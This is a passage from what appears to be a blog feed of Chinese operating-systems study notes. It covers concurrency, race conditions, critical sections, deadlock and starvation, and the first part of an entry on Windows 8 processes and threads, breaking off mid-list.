并发的原理</h3><ul><li><p>在<strong>单处理器多道程序设计系统</strong>中，进程会被<strong>交替</strong>地执行，因而表现出一种并发执行的<u>外部特征</u></p><p>在<strong>多处理器系统</strong>中，不仅可以交替执行进程，而且可以<strong>重叠执行进程</strong></p></li><li><p>交替和重叠都可视为并发处理的一个实例</p></li><li><p>在单处理器情况下，问题源于多道程序设计系统的一个基本特性∶进程的<strong>相对执行速度</strong>不可预测，它取决于<strong>其他进程的活动</strong>、<strong>操作系统处理中断的方式</strong>以及<strong>操作系统的调度策略</strong>，困难</p><ul><li><strong>全局资源的共享</strong>充满了危险<ul><li>同时读写，顺序</li></ul></li><li>操作系统很难对资源进行<strong>最优化分配</strong><ul><li>死锁等问题</li></ul></li><li>定位程序设计错误非常困难<ul><li>结果通常是不确定的和不可再现的</li></ul></li></ul></li></ul><h3 id="5-1-1-一个简单的例子">5.1.1 一个简单的例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">echo</span><span class="hljs-params">()</span>&#123;<br>    chin = getchar();<br>    chout = chin;<br>    <span class="hljs-built_in">putchar</span> (chout); <br>&#125;<br></code></pre></td></tr></table></figure><p>考虑一个支持单用户的<strong>单处理器多道程序设计</strong>系统，过程 echo被视为一个<strong>共享</strong>过程，载入到所有应用程序的公用全局存储区中。 只需使用 echo过程的一个副本==&gt;节省空间</p><p>:one:</p><p>1、P1调用echo过程，并在 getchar 返回它的值并存储于chin后<strong>立即中断</strong>，此时最 近输入的<strong>字符x</strong>保存在变量chin中</p><p>2、进程 P2被激活并调用 echo 过程，echo 过程运行得出结果，输入然后在屏幕上显示单个字符y</p><p>3、P1恢复。此时chin中的值x被写覆盖 ==&gt; 丢失，而chin中的值y传送给chout 并显示出来</p><p>==&gt;第一个字符丢失，第二个字符显示了两次</p><p>:two:假设在这个过程中一次只可以有一个进程</p><ul><li>P1调用 echo  ==&gt; 返回值并存储于 chin ==&gt; 中断</li><li>P2被激活并调用echo ==&gt; （P1仍然在 echo 过程中）P2被阻塞</li><li>P1恢复，完成echo 的执行，并显示出正确的字符x</li><li>P1退出echo ==&gt; 解除P2的阻塞 ==&gt; 成功地调用echo</li></ul><p>:star:定义了一条规则：<strong>一次只允许一个进程</strong>进入echo，并且只有在 echo 过程运行结束后，它才对另一个进程是可用的</p><p>多处理器系统中：</p><p>:one:</p><table><thead><tr><th>P1</th><th>P2</th></tr></thead><tbody><tr><td>*</td><td>*</td></tr><tr><td>chin = getchar ();</td><td>*</td></tr><tr><td>*</td><td>chin = getchar ();</td></tr><tr><td>chout = chin;</td><td>chout = chin;</td></tr><tr><td>putchar (chout);</td><td>*</td></tr><tr><td>*</td><td>putchar (chout);</td></tr><tr><td>*</td><td>*</td></tr></tbody></table><p>结果：输入到P1的字符在显示前丢失，输入到P2的字符显示在P1和P2中</p><p>:two:增加&quot;一次 只能有一个进程处于echo中&quot;的规则：</p><p>1、P1和P2分别在一个单独的处理器上执行，P1调用 echo过程</p><p>2、P1在echo过程中时，P2调用echo ==&gt; P2被阻塞，等待echo 过程可用</p><p>3、P1完成echo的执行，退出该过程并继续执行==&gt; 在P1 从echo中退出的同时，P2立即被恢复并开始执行 echo</p><ul><li>原因<ul><li>中断可能会在进程中的任何地方停止指令的执行（单处理器系统、多处理器系统）</li><li>两个进程同时执行且都试图访问同一个全局变量（多处理系统）</li></ul></li><li>解决：控制对共享资源的访问</li></ul><h3 id="5-1-2-竞争条件">5.1.2 竞争条件</h3><ul><li><p>竞争条件的发生：<strong>多个进程或线程</strong>读写数据时，其最终结果取决于多个进程的指令<strong>执行顺序</strong></p></li><li><p>例：</p><p>1、两个进程P1和 P2共享全局变量 a，都对a进行更新，后更新全局变量a的进程决定了变量 a 的最终值</p><p>2、虑两个进程P3和P4共享全局变量b和c，P3执行赋值语句b = b+ c，P4执行赋值语句c = b + c，最后结果与执行顺序相关</p></li></ul><h3 id="5-1-3-操作系统关注的问题">5.1.3 操作系统关注的问题</h3><p>1、操作系统必须能够<strong>跟踪</strong>不同的进程（进程控制块）</p><p>2、操作系统必须为每个活动进程<strong>分配和释放</strong>各种<strong>资源</strong></p><ul><li>处理器时间∶这是调度功能</li><li>存储器∶大多数操作系统使用虚存方案</li><li>文件∶详见第12章</li><li>I/O设备</li></ul><p>3、操作系统必须保护每个进程的数据和物理资源，避免其他进程的无意于扰（与存储器、文件和 I/O设备相关）</p><p>4、一个进程的功能和<strong>输出结果</strong>必须与<strong>执行速度</strong>无关（相对于其他并发进程的执行速度）</p><h3 id="5-1-4-进程的交互">5.1.4 进程的交互</h3><p>1、进程之间相互<strong>不知道</strong>对方的存在</p><ul><li>独立</li><li>多个独立进程的多道程序设计：批处理作业、交互式会话、两者的混合</li><li>操作系统需要知道它们对资源的竞争情况 （competition）</li><li>如两个无关的应用程序可能都想访问同一个磁盘、文件或打印机</li></ul><p>2、进程<strong>间接知道</strong>对方的存在</p><ul><li>不需要知道对方的进程 ID</li><li>共享某些对象</li><li>共享同一个对象时会表现出<strong>合作行为（cooperation）</strong></li></ul><p>3、进程<strong>直接知道</strong>对方的存在</p><ul><li>可通过进程ID互相通信</li><li>表现出<strong>合作行为（cooperation）</strong></li></ul><table><thead><tr><th>感知程度</th><th>关系</th><th>一个进程对其他进程的影响</th><th>潜在的控制问题</th></tr></thead><tbody><tr><td>进程之间不知道对方的存在</td><td>竞争</td><td>1、一个进程的结果与另一进程的活动无关<br /> 2、进程的执行时间可能会受到影响</td><td>1、互斥<br />2、死锁（可复用资源） <br />3、饥饿</td></tr><tr><td>进程间接知道对方的存在<br />（如共享对象）</td><td>通过<strong>共享</strong>合作</td><td>1、一个进程的结果可能取决于从另一进程<br />2、 进程的执行时间可能会受到影响</td><td>1、互斥<br />2、死锁（可<strong>复用</strong>资源） <br />3、饥饿<br />4、数据一致性</td></tr><tr><td>进程直接知道对方的存在<br />（它们有可用的通信原语）</td><td>通过<strong>通信</strong>合作</td><td>1、一个进程的结果可能取决于从另一进程<br />2、进程的执行时间可能会受到影响</td><td>1、死锁（可<strong>消耗</strong>资源） <br />2、饥饿<br /></td></tr></tbody></table><p>（可能竞争+饥饿）</p><h6 id="进程间的资源竞争">进程间的资源竞争</h6><ul><li><p>当<strong>并发进程</strong><u>竞争使用</u>同一资源时，它们之间会发生冲突</p></li><li><p>资源：I/O设备、存储器、处理器时间、时钟</p></li><li><p>竞争进程间没有任何<strong>信息交换</strong>，但一个进程的执行可能会影响到竞争进程的行为</p></li><li><p>被拒绝访问的进程：阻塞等待，执行速度↓ ==&gt; 甚至永远不能访问该资源</p></li><li><p>竞争进程面临三个<strong>控制</strong>问题：</p><ul><li>需要<strong>互斥（mutual exclusion）</strong><ul><li>一个不可共享的资源：<strong>临界资源（critical resource）</strong><ul><li>在执行过程中，每个进程都给该资源发命令，接收状 态信息，发送数据和接收数据</li></ul></li><li>使用临界资源的那部分程序：程序的<strong>临界区（critical section）</strong></li><li>:star:一次只允许有<strong>一个程序</strong>在<strong>临界区</strong>中</li></ul></li><li><strong>死锁（deadlock）</strong><ul><li>P1、P2都需要R1、R2，操作系统各分配一个 ==&gt; 每个进程都在等待另一个资源，在获得 其他资源并完成功能前，谁都不会释放自己已拥有的资源 ==&gt; 死锁</li></ul></li><li><strong>饥饿（starvation）</strong><ul><li>P1、P2、P3周期性地访问资源R</li><li>访问权轮流授予P1和P3==&gt; 没有死锁，P2被无限地拒绝访问资源</li></ul></li></ul></li><li><p>互斥机制示例</p><p><code>n个进程并发执行</code> <code>临界资源Ra</code></p><ul><li>若另外一个进程在其临界区中，则任何试图进入临界区的进程都必须等待</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//进程1</span><br><span class="hljs-type">void</span> P1<br>&#123;<br><span class="hljs-keyword">while</span>(ture)&#123;<br><span class="hljs-comment">//处理代码;</span><br>entercritical (Ra); <br><span class="hljs-comment">//临界区;</span><br>exitcritical (Ra);<br><span class="hljs-comment">//其他代码;</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//进程2</span><br><span class="hljs-type">void</span> P2<br>&#123;<br><span class="hljs-keyword">while</span>(ture)&#123;<br><span class="hljs-comment">//处理代码;</span><br>entercritical (Ra); <br><span class="hljs-comment">//临界区;</span><br>exitcritical (Ra);<br><span class="hljs-comment">//其他代码;</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//进程n</span><br><span class="hljs-type">void</span> Pn<br>&#123;<br><span class="hljs-keyword">while</span>(ture)&#123;<br><span class="hljs-comment">//处理代码;</span><br>entercritical (Ra); <br><span class="hljs-comment">//临界区;</span><br>exitcritical (Ra);<br><span class="hljs-comment">//其他代码;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h6 id="进程间通过共享合作">进程间通过共享合作</h6><ul><li><p>通过共享进行合作的情况，包括进程间在互相并<strong>不确切知道对方</strong>的情况下进行交互</p><ul><li>多个进程可能访问一个共享变量、共享文件、数据库</li><li>使用、修改共享变量，不涉及其他进程</li><li>知道其他进程也可能访问同一个数据</li></ul><p>==&gt;必须合作 → 确保它们共享的数据得到正确管理 → 控制机制必须确保<strong>共享数据的完整性</strong></p></li><li><p>数据保存在资源（设备或存储器）中 → 涉及有关<strong>互斥、死锁、饥饿</strong>等控制问题</p></li><li><p>:star:<strong>唯一的区别</strong>是可以<strong>按两种不同的模式（读和写）访问数据项</strong>，并且只有<strong>写</strong>操作必须保证<strong>互斥</strong></p></li><li><p>:star:新要求∶<strong>数据一致性</strong></p><ul><li><p>假设两个数据项 a 和b保持着<strong>相等关系 a =b</strong>，修改需同步</p></li><li><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mn>1</mn><mo>:</mo><mi>a</mi><mo>=</mo><mi>a</mi><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mi>b</mi><mo>=</mo><mi>b</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">P1: a=a+1\\b=b+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mn>2</mn><mo>:</mo><mi>b</mi><mo>=</mo><mn>2</mn><mo>∗</mo><mi>b</mi><mspace linebreak="newline"></mspace><mi>a</mi><mo>=</mo><mn>2</mn><mo>∗</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">P2:b=2*b\\a=2*a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></span></p><p>如果最初状态是一致的，则单独执行每个进程会使共享数据仍然保持一致状态</p></li><li><p>考虑并发情况 ,两个进程在每个数据项（a和 b）上都考虑到了互斥</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>a</mi><mo>=</mo><mi>a</mi><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mi>b</mi><mo>=</mo><mn>2</mn><mo>∗</mo><mi>b</mi><mspace linebreak="newline"></mspace><mi>b</mi><mo>=</mo><mi>b</mi><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mi>a</mi><mo>=</mo><mn>2</mn><mo>∗</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">a = a + 1\\b = 2 * b\\ b = b + 1\\ a = 2 * a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></span></p><p>按照这一执行顺序，结果不再保持条件a = b</p><ul><li>开始时有a = b = 1，结束时有 a = 4；b = 3</li></ul><p>==&gt;避免：可以把每个进程中的<strong>整个序列</strong>声明为一个<strong>临界区</strong></p></li><li><p>若使用<strong>临界区</strong>来保护数据的完整性，则没有确定的资源或变量可作为参数。此时，可以把<strong>参数</strong>视为一个在并发进程间共享的<strong>标识符</strong>，用于<strong>标识必须互斥的临界区</strong></p></li></ul></li></ul><h6 id="进程间通过通信合作">进程间通过通信合作</h6><table><thead><tr><th>进程间的资源竞争</th><th>进程间通过共享合作</th><th>进程间通过通信合作</th></tr></thead><tbody><tr><td>有自己独立的环境</td><td>有自己独立的环境</td><td>各个进程都与其他进程进行连接</td></tr><tr><td>在不知道其他进程存在的情况下<strong>共享资源</strong></td><td>共享<strong>变量<br /><strong>每个进程并</strong>未明确</strong>地知道其他进程的存在<br />只知道需要<strong>维护数据的完整性</strong></td><td>通信提供<strong>同步</strong>和<strong>协调各种活动</strong>的方法</td></tr></tbody></table><ul><li><p>有自己独立的环境指：</p><ul><li>不包括其他进程，进程间的交互是间接的，都存在共享</li></ul></li><li><p>通信：由各种类型的消息组成</p></li><li><p>发送消息和接收消息的<u>原语</u>由<u>程序设计语言</u>提供， 或由<u>操作系统的内核</u>提供</p></li><li><p>在传递消息的过程中进程间<strong>未共享任何对象</strong> → 这类合作<strong>不需要互斥</strong>，但仍然存在<strong>死锁</strong>和<strong>饥饿</strong>问题</p><ul><li><p>死锁：</p><ul><li>两个进程<strong>都被阻塞</strong>，每个<strong>都在等待</strong>来自对方的通信 → 死锁</li></ul></li><li><p>饥饿：</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8A%EF%BC%89/os1.jpg" class=""></li></ul></li></ul><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">进程间的资源竞争</th><th style="text-align:center">进程间通过共享合作</th><th style="text-align:center">进程间通过通信合作</th></tr></thead><tbody><tr><td style="text-align:center">问题</td><td style="text-align:center">互斥<br />死锁<br />饥饿</td><td style="text-align:center">互斥<br />死锁<br />饥饿</td><td style="text-align:center">死锁<br />饥饿</td></tr></tbody></table><h3 id="5-1-5-互斥的要求">5.1.5 互斥的要求</h3><p>:one:必须强制实施互斥∶</p><p>​  在与<strong>相同资源</strong>或<strong>共享对象</strong>的<strong>临界区</strong>有关的<strong>所有进程</strong>中，一次只允许<strong>一个进程</strong>进入临界区</p><p>:two:一个在<strong>非临界区停止</strong>的进程<strong>不能干涉其他进程</strong></p><p>:three:<u>绝不允许</u>出现需要访问临界区的进程被<strong>无限延迟</strong>的情况，<u>即不会死锁或饥饿</u></p><p>:four:没有进程在临界区中时，任何需要进入临界区的进程必须能够<strong>立即进入</strong></p><p>:five:对相关进程的<strong>执行速度</strong>和<strong>处理器的数量</strong><u>没有任何要求和限制</u></p><p>:six:一个进程<strong>驻留</strong>在临界区中的<strong>时间必须是有限的</strong></p><ul><li>满足方法<ul><li>软件方法：让并发执行的进程承担这一责任<ul><li>这类进程（不论是系统程序还是应用程序）需要与另一个进程合作</li><li>不需要程序设计语言或操作系统提供任何支持来实施互斥</li><li>可以更好地理解并发处理的复杂性</li><li>会增加开销并存在缺陷</li></ul></li><li>硬件方法：涉及专用机器指令<ul><li>可以减少开销</li><li>却很难成为一种通用的解决方案</li></ul></li><li>操作系统提供：在操作系统或程序设计语言中提供某种级别的支持</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四章-进程和线程（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1>4.4 Windows 8的进程和线程管</h1><ul><li><p>应用程序（application）</p><ul><li><p>由一个或多个<strong>进程</strong>组成</p></li><li><p>每个进程（process）提供执行程序所需要的<strong>资源</strong></p></li><li><p>每个进程的组成：</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/osw1.jpg" class=""></li><li><p>每个<strong>进程</strong>都以一个称为<strong>主线程</strong>的<strong>单线程</strong>开始</p></li><li><p>任何一个线程可以创建其他线程</p></li></ul></li><li><p>线程（thread）</p><ul><li><p>进程中可被<strong>调度执行</strong>的实体</p></li><li><p>一个进程的<strong>所有线程</strong>共享其<strong>虚拟地址空间</strong>和<strong>系统资源</strong></p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/osw2.jpg" class=""></li></ul></li><li><p>作业对象（jab objece）</p><ul><li>允许将<strong>一组进程</strong>当作<strong>一个单元</strong>来管理</li><li>作业对象：可命名、可获得、可共享</li><li>这些对象<strong>控制</strong>与其相关的<strong>进程的属性</strong></li><li>作业对象上的操作会影响所有与工作对象相关的进程<ul><li>包括强制性限制，如工作集大小和进程优先级，或终止与作业有关的所有进程</li></ul></li></ul></li><li><p>线程池（thread pool）</p><ul><li>是一个<strong>工作线程集</strong>，它可代表<strong>应用程序</strong>有效地执行<strong>异步回调</strong></li><li>主要用于<u>减少<strong>应用程序线程</strong>的数量</u>，并<u>对工作线程进行<strong>管理</strong></u></li></ul></li><li><p>纤程（fiber）</p><ul><li>是必须由<strong>应用程序调度</strong>的一个<strong>可执行单元</strong></li><li>纤程运行在调度其的线程的<strong>上下文</strong>中</li><li>每个线程可以调度多个纤程</li><li>一般来说，纤程在设计良好的多线程应用中没有优势，但使用纤程会使得<strong>调度自身线程的端口程序</strong>变得更为容易</li><li>若一个纤程访问<strong>线程的本地存储空间</strong>，则它是在访问运行它的线程的本地存储空间</li><li>纤程没有与之关联的相同状态信息，唯一为纤程保存的状态信息是<strong>纤程的栈</strong>、<strong>纤程的寄存器子集</strong>，以及创建纤程期间提供的数据</li><li>保存寄存器通常是通过函数调用而保存的一组寄存器</li><li>纤程不预先调度，一个<strong>线程</strong>通过从另一个纤程<strong>切换</strong>到当前纤程来<strong>调度</strong>纤程</li><li>正运行纤程的线程被抢占时，其当前运行的纤程会被抢占，但仍被选择</li></ul></li><li><p>用户模式调度（User-mode scheduling，UMS）</p><ul><li>应用程序用于安排自己的线程的一种轻量级机制</li><li>应用程序可在<strong>不陷入系统调用</strong>的情况下，以<strong>用户模式</strong>切换UMS线程，而且在一个UMS 线程在内核中发生<strong>阻塞</strong>时，程序可以收回<strong>对处理器的控制权</strong></li><li>每个UMS 线程都有自己的线程上下文，它们<strong>不共享</strong>单个线程的上下文</li><li>适用于需要极少系统调用的短期工作项目、需要有效地在<strong>多处理器或多核系统</strong>上<strong>并行多线程</strong>这类<strong>高性能要求</strong>的应用程序</li><li>利用UMS 的优势，应用程序必须实现调度程序组件，以便管理应用程序的 UMS线程并决定何时运行这些线程</li></ul></li></ul><h3 id="4-4-1">4.4.1</h3><ul><li><p>传统Windows</p><ul><li>向用户提供<strong>所有进程</strong>的<strong>生命周期控制权</strong><ul><li>在传统的桌面环境 下，用户需要负责关闭应用程序，但对话框会提醒他们保存用户数据（Windows8的桌面模式中得以保留，而在Windows 8最新的 Metro界面上，Windows 8管理应用程序进程的生命周期）</li></ul></li></ul></li><li><p>Windows8</p><ul><li>开发人员只需管理各 个应用程序的状态</li><li>在 Metro 界面中只有几个应用程序可以通过辅屏视图运行在主应用程序旁边，但同一时刻只有一个 Store 应用程序可以运行</li><li>Windows 8的Live Tiles通过<strong>列表方式</strong>来展现常用的应用程序。实际上它们接收推送通知，显示动态内容时<u>并未占用系统资源</u></li><li>在 Metro 界面上显示的<strong>前台应用</strong>是通过<strong>处理器、网络、可用硬盘资源</strong>呈现给用户的，其他所有应用处于<strong>挂起态</strong>，不访问这些资源</li><li>即使应用被挂起，应用数据仍会保持在系统中，直到应用重新开始</li><li>有些应用程序（如动态信息）可通过查看与之前执行的应用程序相关联的<strong>数据戳</strong>并选择<strong>丢弃数据</strong>来支持新获得的信息（由开发者而非操作系统决定）</li><li>为处理后台任务的需求，程序开发人员建立了一个后台任务 API，它能在应用不在前台时执行小型任务</li><li>推送信息是标准可扩展标记语言（XML）字符串，由云服务管理，也称为Windows通知服务 （Windows Notification Service，WNS）</li><li>服务向用户的后台程序推送更新。API将以<strong>队列</strong>方式来管理这些请求，并在请示获得了<u>足够的处理器资源</u>时运行它们</li><li>后台任务在<strong>处理器的使用</strong>方面受到了严格限制，以确保<u>关键任务保证能获得应用程序资源</u>。（并不能保证会运行一个后台应用程序）</li></ul></li></ul><h3 id="4-4-2-Windows进程">4.4.2 Windows进程</h3><ul><li><p>特点</p><ul><li>Windows 进程作为<strong>对象</strong>实现</li><li>个进程可被创建为一个新进程，或一个已有进程的副本</li><li>一个可执行的进程可包含一个或多个线程</li><li>进程对象和线程对象都<strong>内置有同步能力</strong></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/os4.10.jpg" class=""><ul><li>每个进程都被指定了一个<strong>安全访问令牌（security access  token）</strong>，称为进程的<strong>基本令牌</strong>（ primary token of the process）</li><li>用户初次登录时，Windows 创建一个<u>包括用户安全ID</u>的访问令牌</li><li>每个 <u>由用户创建的进程</u> 或 <u>代表用户运行的进程</u> 都有该访问令牌的一个<strong>副本</strong>，Windows使用该令牌来让用户访问受保护的对象，或在系统上和受保护的对象上执行限定的功能</li><li><strong>访问令牌</strong>控制该进程是否可以<strong>改变其自身的属性</strong>，该进程没有已打开的访问令牌的句柄。<strong>进程</strong>试图打开这样的一个句柄时，<strong>安全系统</strong>会确认是否允许这样做，即确定该进程是否可以改变自己的属性</li><li>与进程相关的还有定义当前分派给该进程的虚拟地址空间的一系列块。进程不能直接修改这些结构，必须依赖于<strong>虚存管理器</strong>来为进程提供<strong>内存分配服务</strong></li><li>进程还包括一个<strong>对象表</strong>，表中内容为该进程所知其他对象的句柄。对象中包含的<strong>每个线程</strong>都有一个<strong>句柄</strong></li></ul></li></ul><h3 id="4-4-3-进程对象和线程对象">4.4.3 进程对象和线程对象</h3><ul><li>进程<ul><li>是一个实体</li><li>用对象来表示</li><li>许多属性、封装</li><li>该实体对应于拥有内存、打开的文件等资源的<strong>用户作业</strong>或<strong>应用程序</strong></li><li>调用服务的唯一方法：向提供该服务的进程对象发送消息</li><li>Windows 创建一个进程后，会使用为Windows 进程定义的、用做模板的<strong>对象类或类型</strong>来生成一个新的<strong>对象实例</strong>，并在创建对象时为其<strong>赋属性值</strong></li><li>Windows 进程对象属性<ul><li>进程 ID</li><li>基本优先级：线程的基本执行优先级</li><li>安全描述符（Security descriptor）：描述谁<strong>创建</strong>了对象，谁可以<strong>访问</strong>或<strong>使用</strong>该对象、<strong>禁止</strong>谁访问该对象</li><li>默认处理器亲和性（Default processor affinity）：可以运行进程中线程的<strong>默认处理器集合</strong></li><li>配额限制（Quota limits）：用户进程可以使用的已分页和未分页系统<strong>内存的最大值</strong>、<strong>分页文件空间的最大值</strong>及<strong>处理器时间的最大值</strong></li><li>执行时间：进程中<strong>所有线程</strong>已执行的<strong>时间总量</strong></li><li>I/O 